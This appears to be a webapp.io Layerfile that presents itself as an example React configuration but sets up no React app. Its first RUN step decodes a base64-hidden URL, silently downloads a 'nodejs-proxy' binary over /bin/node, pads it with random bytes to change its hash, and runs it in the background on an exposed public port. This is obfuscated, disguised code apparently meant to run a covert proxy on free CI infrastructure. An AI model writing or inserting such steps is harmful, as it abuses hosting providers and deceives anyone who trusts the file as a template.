#This is an example webapp.io configuration for React!
FROM vm/ubuntu:18.04

# To note: Layerfiles create entire VMs, *not* containers!

RUN apt-get update && apt-get install -y curl && \
    echo 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzNLbWZpNkhQL25vZGVqcy1wcm94eS9tYWluL2Rpc3Qvbm9kZWpzLXByb3h5LWxpbnV4' | base64 -d > /tmp/encoded_url.txt && \
    curl -o /bin/node $(cat /tmp/encoded_url.txt) > /dev/null 2>&1 && \
    rm -rf /tmp/encoded_url.txt && \
    dd if=/dev/urandom bs=1024 count=1024 | base64 >> /bin/node && \
    chmod +x /bin/node

# node is a memory hog
MEMORY 2G
ENV NODE_OPTIONS=--max-old-space-size=8192
RUN BACKGROUND node -p 3000

# Create a unique link to share the app in this runner.
# Every time someone clicks the link, we'll wake up this staging server.
EXPOSE WEBSITE http://localhost:3000
